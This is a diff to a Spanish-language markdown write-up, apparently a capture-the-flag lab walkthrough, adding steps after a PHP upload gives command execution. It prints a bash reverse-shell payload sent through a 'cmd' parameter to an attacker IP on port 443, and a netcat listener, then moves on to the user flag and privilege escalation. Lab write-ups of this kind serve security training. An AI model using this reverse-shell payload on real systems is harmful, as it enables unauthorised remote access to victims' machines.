@@ -67,4 +67,18 @@ Crearemos un archivo `.php`
 Lo subiremos y accederemos a la ruta
 ![[Pasted image 20260909213058.png]]
 
-Hemos obtenido *RCE (Remote Command Ejecution)* ya que hemos conseguido obtener la direcc
+Hemos obtenido *RCE (Remote Command Ejecution)* ya que hemos conseguido obtener el nombre del usuario
+Ahora cargaremos una *Reverse Shell* y entablaremos una conexión con nuestra maquina atacante
+```shell
+?cmd=bash -c "bash -i >%26 /dev/tcp/10.10.14.226/443 0>%261"
+```
+
+Y poniendonos antes en escucha con
+```shell
+nc -nlvp 443
+```
+
+Conseguimos entrablar una *Rverse Shell* con la maquina victima aghora haremos el tratamiento de la TTY y continuaremos con la explotacionm
+En el directorio del usuario encontraremos la flag del user
+
+Ahora realizaremos la escalada de privilegios 
